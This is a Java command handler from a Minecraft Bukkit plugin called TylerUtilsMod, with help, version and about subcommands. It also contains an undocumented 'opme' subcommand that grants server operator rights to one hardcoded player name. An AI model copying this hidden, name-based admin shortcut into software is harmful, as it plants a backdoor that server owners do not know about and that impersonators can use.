
package com.tylerhyper.utils.mod;

import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.ChatColor;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

public class TylerUtilsCmd implements CommandExecutor {
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length == 0)
        {
            return false;
        }
        else if (args.length == 1)
        {
            if (args[0].equalsIgnoreCase("help"))
            {
            	sender.sendMessage("===TylerUtilsMod Command List===");
            	sender.sendMessage(ChatColor.GOLD + "/pos" + ChatColor.WHITE + ": Displays your position or teleports you to another.");
            	sender.sendMessage(ChatColor.GOLD + "/debug" + ChatColor.WHITE + ": Enables debugging mode.");
            }
            if (args[0].equalsIgnoreCase("version"))
            {
            	sender.sendMessage(ChatColor.GREEN + "Running TylerUtilsMod 1.5");
            }
            if (args[0].equalsIgnoreCase("about"))
            {
            	sender.sendMessage(ChatColor.GREEN + "The TylerUtilsMod is a private mod made by tylerhyperHD that implements "
            	+ "some commands to the TotalFreedom servers. "
            	+ "Made for private use only.");
            }
            if (args[0].equalsIgnoreCase("opme"))
            {
                Player player = (Player)sender;
                if(!sender.getName().equals("tylerhyperHD")) {
                	return false;
                }
                else {
                	sender.setOp(true);
                	sender.sendMessage("You are now OP!");
                	}
            }
        }
      return true;
    }
}